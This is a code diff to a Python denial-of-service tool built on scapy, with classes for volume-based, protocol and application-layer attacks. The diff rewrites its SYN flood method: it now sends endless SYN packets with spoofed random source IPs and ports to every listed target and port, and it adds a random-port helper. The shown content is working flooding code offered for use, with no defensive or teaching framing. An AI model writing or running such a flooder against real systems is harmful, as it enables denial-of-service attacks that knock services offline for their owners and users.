@@ -9,6 +9,8 @@ from scapy.all import IP, TCP, send, RandShort
 def random_ip():
     return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
 
+def random_port():
+    return random.randint(1024, 65535)
 
 class VolumeBasedAttack:
     @staticmethod
@@ -141,35 +143,18 @@ class ProtocolAttack:
 
 
     @staticmethod
-    def syn_flood(vector: list, port: int, bye: bytes):
-        portt = input("If you want to change the verbose mode or the starting port, type y... if not, press (n) or other \n")
-        if portt.lower() == 'y':
-            sport = input("You can choose a different port where your TCP signal will start, do you want? (y/n) \n")
-            verbose = input("You can also choose if you want to make some noise while doing the attack, not advised, do you want? (y/n) \n")
+    def syn_flood(vector: list, port: list):
+        print("this could be run only with root privilage")
+        for tar in vector:
+                for i in port:
+                    ip_packet = IP(src=random_ip(), dst=tar)
+                    tcp_packet = TCP(sport=random_port(), dport=int(i), flags="S", seq=random.randint(1000, 9000))
 
-            if sport.lower() == 'y':
-                try:
-                    ssport = int(input("Choose the port: \n"))
-                    if not (0 <= ssport <= 65535):
-                        raise ValueError("Port out of range")
-                except ValueError as e:
-                    print(f"Invalid port: {e}")
-                    return
-            else:
-                ssport = RandShort()
-            
-            verbose_mode = 1 if verbose.lower() == 'y' else 0
-            
-        else:
-            ssport = RandShort()
-            verbose_mode = 0
+                    pkt = ip_packet/tcp_packet
 
-            for i in vector:
-                ip = IP(dst=i)
-                raw = bye
-                tcp = TCP(sport=ssport, dport=port, flags="S")
-                pkt = ip/tcp/raw
-                send(pkt, loop=1, verbose=verbose_mode)
+                    send(pkt, verbose=0, loop=1)
+
+        print(f"Pacchetto inviato da {ip_packet.src}:{tcp_packet.sport} a {ip_packet.dst}:{tcp_packet.dport}")
 
 class ApplicationLayerAttack:
     @staticmethod
